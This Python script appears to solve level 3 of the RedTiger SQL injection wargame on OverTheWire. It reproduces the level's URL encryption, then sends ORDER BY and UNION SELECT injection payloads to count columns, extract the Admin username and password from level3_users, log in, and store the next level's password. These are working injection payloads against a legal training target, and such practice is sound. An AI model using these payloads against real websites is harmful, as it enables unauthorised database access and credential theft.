#!/usr/bin/env python3
import tigers as tg
import base64
from os import popen
import subprocess
import tiger_cookies


def encrypt_python(cryptstr: str):
    """
    encryption function for level 3
    the original code has been rewritten to python 3
    the sequence of random numbers corresponds to
    the output of the function $srd = rand(0, 255);
    for srand(3284724) php 5.x;
    """
    cryptedstr = ""
    rand_num = [107, 183, 99, 223, 226, 137, 255, 56, 162, 1, 221,
                252, 41, 207, 127, 101, 223, 97, 157, 106, 13, 235,
                223, 247, 100, 218, 174, 252, 133, 76, 181, 240, 4,
                24, 208, 230, 162, 207, 30, 68, 208, 252, 65, 250,
                204, 192, 96, 171, 34, 254, 22, 48, 234, 246, 40,
                78, 208, 215, 74, 86, 35, 255, 71, 39, 24, 23, 14,
                187, 231, 45, 255, 184, 42, 65, 178, 246, 2, 19,
                162, 37, 18, 185, 85, 252, 175, 125, 74, 128, 84,
                149, 214, 120, 149, 29, 160, 174, 52, 175, 105, 28,
                220, 105, 212, 7, 170, 135, 254, 172, 154, 160, 209,
                172, 90, 39, 169, 9, 165, 243, 137, 250]

    for i in range(len(cryptstr)):
        srd = rand_num[i]
        temp = str(ord(cryptstr[i]) ^ srd)
        while len(temp) < 3:
            temp = "0" + temp

        cryptedstr += temp

    return (base64.b64encode(cryptedstr.encode("ascii"))).decode("utf-8")


def encrypt_php(cryptstr: str):
    """
    encryption function for level 3
    requires php 5.x
    reproduces the code from view-source:https://redtiger.labs.overthewire.org/urlcrypt.inc
    """
    result = subprocess.run(
        ['php', '-f', 'tiger3.php', cryptstr],  # program and arguments
        stdout=subprocess.PIPE,  # capture stdout
        check=True  # raise exception if program fails
    )
    cryptstr = result.stdout
    return cryptstr.decode("utf-8")


def main():
    """
    Url-encoding with simple sql injection

    Target: Get the password of the user Admin.
    Hint: Try to get an error. Tablename: level3_users
    """
    base_name = 'level3_users'
    url = "https://redtiger.labs.overthewire.org/level3.php"
    finds = ['username', 'password']  # what we are finding
    pass_r = 'The password for the next level is: '
    level = 'level3login'
    method = 'get'
    inj_param = 'usr[]'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level3login=cooks[level])

    # Search for warnings
    payload = ''
    p = tg.SqlInjection(url, cook, method, inj_param, payload, check_clear=pass_r)
    war = p.find_error()
    print(war)

    # Check php version
    fun = encrypt_python
    pipe = popen('php --version')
    content = pipe.read(5)
    print(content)
    if content[4] == '5':
        fun = encrypt_php

    # Counting the number of columns
    # data = dict(usr="' order by %s #")
    p.inj_param = 'usr'
    p.payload = "' order by %s #"
    p.fun_encode = fun
    if not (columns := p.count_columns_order_by()):
        return False

    # Search for visible columns
    p.payload = f"' union select %s from {base_name} where username='Admin'#"
    resp, visible = p.find_visible_columns(columns)
    if not visible:
        return False

    # Search for desired data
    if not (keys := p.find_param(finds, resp, columns)):
        return False

    # Authorization
    other_param = {'user': keys[0], 'password': keys[1], 'login': 'Login'}
    p.inj_param = ''
    p.other_param = other_param
    p.method = 'post'
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
